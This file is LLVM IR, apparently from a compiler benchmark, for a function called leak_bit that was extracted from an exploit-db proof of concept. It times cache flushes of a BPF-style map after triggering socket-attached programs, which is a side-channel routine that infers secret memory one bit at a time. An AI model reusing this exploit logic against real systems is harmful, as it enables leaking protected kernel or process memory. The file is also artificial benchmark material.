; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_44695.c_leak_bit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_44695.c_leak_bit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@input_map = common dso_local global i32 0, align 4
@leak_map = common dso_local global i32 0, align 4
@sockfds = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [10 x i8] c"%d vs %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @leak_bit(i64 %0, i32 %1) #0 {
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i64 %0, i64* %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = load i32, i32* @input_map, align 4
  %10 = load i64, i64* %3, align 8
  %11 = call i32 @array_set_dw(i32 %9, i32 0, i64 %10)
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  br label %12

12:                                               ; preds = %51, %2
  %13 = load i32, i32* %5, align 4
  %14 = load i32, i32* %6, align 4
  %15 = add nsw i32 %13, %14
  %16 = icmp slt i32 %15, 100
  br i1 %16, label %17, label %52

17:                                               ; preds = %12
  %18 = load i32, i32* @leak_map, align 4
  %19 = call i32 @array_time_flush_loc(i32 %18, i32 0, i32 6144)
  %20 = load i32*, i32** @sockfds, align 8
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 8
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i32, i32* %20, i64 %23
  %25 = load i32, i32* %24, align 4
  %26 = call i32 @trigger_proc(i32 %25)
  %27 = load i32, i32* @leak_map, align 4
  %28 = call i32 @array_time_flush_loc(i32 %27, i32 0, i32 6144)
  store i32 %28, i32* %7, align 4
  %29 = load i32, i32* @leak_map, align 4
  %30 = call i32 @array_time_flush_loc(i32 %29, i32 0, i32 2048)
  %31 = load i32*, i32** @sockfds, align 8
  %32 = load i32, i32* %4, align 4
  %33 = add nsw i32 %32, 0
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %31, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @trigger_proc(i32 %36)
  %38 = load i32, i32* @leak_map, align 4
  %39 = call i32 @array_time_flush_loc(i32 %38, i32 0, i32 2048)
  store i32 %39, i32* %8, align 4
  %40 = load i32, i32* %8, align 4
  %41 = icmp ult i32 %40, 50
  br i1 %41, label %42, label %45

42:                                               ; preds = %17
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  br label %45

45:                                               ; preds = %42, %17
  %46 = load i32, i32* %7, align 4
  %47 = icmp ult i32 %46, 50
  br i1 %47, label %48, label %51

48:                                               ; preds = %45
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %6, align 4
  br label %51

51:                                               ; preds = %48, %45
  br label %12

52:                                               ; preds = %12
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* %6, align 4
  %55 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %53, i32 %54)
  %56 = load i32, i32* %5, align 4
  %57 = load i32, i32* %6, align 4
  %58 = icmp sgt i32 %56, %57
  %59 = zext i1 %58 to i64
  %60 = select i1 %58, i32 0, i32 1
  ret i32 %60
}

declare dso_local i32 @array_set_dw(i32, i32, i64) #1

declare dso_local i32 @array_time_flush_loc(i32, i32, i32) #1

declare dso_local i32 @trigger_proc(i32) #1

declare dso_local i32 @printf(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
